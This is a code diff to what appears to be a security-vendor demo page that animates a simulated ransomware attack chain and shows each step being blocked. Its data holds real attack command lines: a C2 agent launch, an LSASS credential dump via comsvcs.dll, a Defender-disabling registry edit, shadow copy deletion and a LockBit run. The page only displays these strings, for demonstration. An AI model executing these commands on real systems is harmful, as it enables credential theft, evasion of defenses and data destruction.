@@ -229,6 +229,48 @@ html, body { width: 100%; height: 100%; overflow: hidden; background: #0a0e18; c
 .rw-timer { font-size:22px; font-weight:700; color:#ff3333; font-family:var(--font-mono); letter-spacing:0.1em; text-shadow:0 0 16px rgba(255,50,50,0.5); }
 .rw-timer-lbl { font-size:9px; color:rgba(255,255,255,0.3); font-family:var(--font-mono); text-transform:uppercase; letter-spacing:0.1em; margin-top:3px; }
 .rw-id { margin-top:10px; font-size:8px; color:rgba(255,255,255,0.15); font-family:var(--font-mono); }
+
+/* ── FEED ── */
+.feed-item {
+  padding:5px 14px; display:flex; gap:10px; align-items:flex-start;
+  border-left:2px solid transparent; transition:all 0.2s ease;
+}
+.feed-item.fi-done    { opacity:0.5; }
+.feed-item.fi-running { background:rgba(255,180,0,0.04); border-left-color:#ffb400; }
+.feed-item.fi-blocked { background:rgba(0,101,189,0.06); border-left-color:#0065BD; }
+.feed-item.fi-stopped { background:rgba(0,242,179,0.06); border-left-color:#00f2b3; }
+
+.fi-time    { color:rgba(232,240,255,0.25); flex-shrink:0; font-size:10px; padding-top:1px; min-width:34px; }
+.fi-content { flex:1; min-width:0; }
+.fi-tactic  { font-size:9px; font-weight:700; letter-spacing:0.1em; text-transform:uppercase; margin-bottom:2px; font-family:var(--font-ui); }
+.fi-name    { font-size:12px; color:rgba(232,240,255,0.85); margin-bottom:2px; }
+.fi-name.struck { text-decoration:line-through; text-decoration-color:rgba(0,101,189,0.5); color:rgba(232,240,255,0.45); }
+.fi-cmd     { font-size:10px; color:rgba(232,240,255,0.35); }
+.fi-reason  { font-size:10px; color:var(--block-blue); margin-top:3px; display:none; }
+.fi-reason.visible { display:block; }
+.fi-status  {
+  font-size:9px; padding:1px 6px; border-radius:3px;
+  flex-shrink:0; margin-top:2px;
+  font-family:var(--font-ui); font-weight:600; letter-spacing:0.05em;
+}
+.s-done    { background:rgba(255,50,50,0.1);   color:#ff7777;  border:1px solid rgba(255,50,50,0.2); }
+.s-running { background:rgba(255,180,0,0.12);  color:#ffb400;  border:1px solid rgba(255,180,0,0.3); }
+.s-waiting { background:rgba(255,255,255,0.04);color:rgba(232,240,255,0.3); border:1px solid rgba(255,255,255,0.08); }
+.s-blocked { background:rgba(0,101,189,0.15);  color:#6ab4ff;  border:1px solid rgba(0,101,189,0.35); }
+.s-stopped { background:rgba(0,242,179,0.1);   color:#00f2b3;  border:1px solid rgba(0,242,179,0.3); }
+
+.feed-div { margin:6px 14px; border:none; border-top:1px solid rgba(255,255,255,0.05); }
+
+/* Block counter */
+#block-counter {
+  margin:8px 14px; padding:7px 12px;
+  background:rgba(0,101,189,0.08); border:1px solid rgba(0,101,189,0.2);
+  border-radius:6px; display:none; align-items:center; gap:10px;
+  font-family:var(--font-ui);
+}
+#block-counter.visible { display:flex; }
+.bc-text  { font-size:11px; color:rgba(232,240,255,0.7); flex:1; }
+.bc-count { font-size:13px; font-weight:700; color:#6ab4ff; }
 </style>
 </head>
 <body>
@@ -425,6 +467,114 @@ if (!sessionStorage.getItem('demo_hint_shown')) {
   setTimeout(() => document.getElementById('key-hint').classList.add('hidden'), 4000);
 } else {
   document.getElementById('key-hint').classList.add('hidden');
+}
+
+// ── ABILITY DATA ──
+const ABILITIES = [
+  {
+    id: 'f0', tactic: 'Execution', tacticClass: 'tac-exec',
+    name: 'Sandcat agent deployed on victim',
+    cmd:  'splunkd.exe -server http://192.168.1.63:8888 -group red',
+    blockReason: null
+  },
+  {
+    id: 'f1', tactic: 'Credential Access', tacticClass: 'tac-cred',
+    name: 'LSASS memory dump — credential harvest',
+    cmd:  'rundll32.exe comsvcs.dll MiniDump 624 lsass.dmp full',
+    blockReason: '🛡 Intercept X — Credential theft protection triggered'
+  },
+  {
+    id: 'f2', tactic: 'Defense Evasion', tacticClass: 'tac-def',
+    name: 'Windows Defender disabled via registry',
+    cmd:  'reg add "HKLM\\...\\Windows Defender" /v DisableAntiSpyware /d 1',
+    blockReason: '🛡 Tamper Protection — Registry modification blocked'
+  },
+  {
+    id: 'f3', tactic: 'Defense Evasion', tacticClass: 'tac-def',
+    name: 'Shadow copies deleted — no rollback',
+    cmd:  'vssadmin.exe delete shadows /all /quiet',
+    blockReason: '🛡 CryptoGuard — Shadow copy deletion blocked'
+  },
+  {
+    id: 'f4', tactic: 'Impact · T1486', tacticClass: 'tac-impact',
+    name: 'Data encrypted for impact — LockBit 3.0',
+    cmd:  '.\\lockbit3.exe --target C:\\Users\\demo --threads 8',
+    blockReason: '🛡 CryptoGuard — Ransomware process terminated · Files restored'
+  }
+];
+
+// Tactic label colors
+const TACTIC_COLORS = {
+  'tac-exec':   '#ce9178',
+  'tac-cred':   '#dcdcaa',
+  'tac-def':    '#ff9999',
+  'tac-impact': '#ff6666'
+};
+
+// Build feed HTML
+function buildFeed() {
+  const feed = document.getElementById('feed');
+  let html = '<div id="block-counter" class=""><span class="bc-text">🛡 Sophos blocks this session</span><span class="bc-count" id="bc-count">0 blocked</span></div>';
+  ABILITIES.forEach((ab, i) => {
+    const color = TACTIC_COLORS[ab.tacticClass] || '#aaa';
+    html += `
+      <div class="feed-item" id="${ab.id}" data-i="${i}">
+        <div class="fi-time" id="${ab.id}-t">--:--</div>
+        <div class="fi-content">
+          <div class="fi-tactic" style="color:${color}" id="${ab.id}-tac">${ab.tactic}</div>
+          <div class="fi-name" id="${ab.id}-name">${ab.name}</div>
+          <div class="fi-cmd">${ab.cmd}</div>
+          ${ab.blockReason ? `<div class="fi-reason" id="${ab.id}-reason">${ab.blockReason}</div>` : ''}
+        </div>
+        <div class="fi-status s-waiting" id="${ab.id}-status">WAITING</div>
+      </div>`;
+    if (i < ABILITIES.length - 1) html += '<hr class="feed-div"/>';
+  });
+  feed.innerHTML = html;
+}
+
+buildFeed();
+
+// Feed state helpers
+function feedDone(id, time) {
+  document.getElementById(id).className = 'feed-item fi-done';
+  document.getElementById(id+'-t').textContent = time;
+  document.getElementById(id+'-status').className = 'fi-status s-done';
+  document.getElementById(id+'-status').textContent = 'DONE';
+}
+function feedRunning(id, time) {
+  document.getElementById(id).className = 'feed-item fi-running';
+  document.getElementById(id+'-t').textContent = time;
+  document.getElementById(id+'-status').className = 'fi-status s-running';
+  document.getElementById(id+'-status').textContent = 'RUNNING';
+}
+function feedBlocked(id, time, isFinal) {
+  document.getElementById(id).className = 'feed-item fi-blocked';
+  document.getElementById(id+'-t').textContent = time;
+  document.getElementById(id+'-name').classList.add('struck');
+  const origTac = ABILITIES[parseInt(document.getElementById(id).dataset.i)].tactic;
+  document.getElementById(id+'-tac').textContent = '🛡 BLOCKED · ' + origTac;
+  document.getElementById(id+'-status').className = 'fi-status ' + (isFinal ? 's-stopped' : 's-blocked');
+  document.getElementById(id+'-status').textContent = isFinal ? 'STOPPED' : 'BLOCKED';
+  const reason = document.getElementById(id+'-reason');
+  if (reason) reason.classList.add('visible');
+}
+function feedReset() {
+  ABILITIES.forEach(ab => {
+    document.getElementById(ab.id).className = 'feed-item';
+    document.getElementById(ab.id+'-t').textContent = '--:--';
+    document.getElementById(ab.id+'-name').classList.remove('struck');
+    document.getElementById(ab.id+'-tac').textContent = ab.tactic;
+    document.getElementById(ab.id+'-status').className = 'fi-status s-waiting';
+    document.getElementById(ab.id+'-status').textContent = 'WAITING';
+    const reason = document.getElementById(ab.id+'-reason');
+    if (reason) reason.classList.remove('visible');
+  });
+  document.getElementById('block-counter').classList.remove('visible');
+}
+function setBlockCount(n, outOf) {
+  document.getElementById('block-counter').classList.add('visible');
+  document.getElementById('bc-count').textContent = outOf ? `${n} of ${outOf} blocked` : `${n} blocked`;
 }
 </script>
 </body>
